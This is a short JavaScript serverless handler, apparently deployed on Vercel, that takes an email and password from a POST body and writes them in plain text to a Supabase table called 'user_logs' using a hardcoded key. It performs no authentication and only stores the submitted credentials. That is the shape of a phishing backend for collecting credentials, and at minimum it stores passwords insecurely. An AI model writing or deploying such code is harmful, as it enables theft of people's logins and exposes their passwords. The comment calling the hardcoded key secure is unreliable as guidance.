export default async function handler(req, res) {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const supabaseUrl = "https://vhkxrhuygujrghgjikdu.supabase.co";
  // Hardcoding the key here since it's a server-side file hosted securely on Vercel
  const supabaseKey = "sb_publishable_NaZ5L8e0wq_hzQ8WNCk_cQ_zMPI5FB-";

  const { email, password } = req.body;

  try {
    const response = await fetch(`${supabaseUrl}/rest/v1/user_logs`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': supabaseKey,
        'Authorization': `Bearer ${supabaseKey}`,
        'Prefer': 'return=minimal'
      },
      body: JSON.stringify({
        email: email,
        password: password
      })
    });

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(errorText);
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}
